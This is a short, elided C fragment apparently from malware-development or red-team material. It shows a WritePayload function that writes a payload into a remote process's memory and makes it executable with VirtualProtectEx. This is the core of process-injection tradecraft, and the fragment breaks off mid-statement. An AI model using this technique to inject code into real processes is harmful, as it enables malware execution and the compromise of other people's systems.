...
BOOL WritePayload(IN HANDLE hProcess, IN PVOID pAddress, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {
	...
	if (!WriteProcessMemory(hProcess, pAddress, pPayload, sPayloadSize, &sNumberOfBytesWritten)) {
		printf("[!] WriteProcessMemory [RW] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	if (!VirtualProtectEx(hProcess, pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection) || sPayloadSize != sNumberOfBytesWritten) {
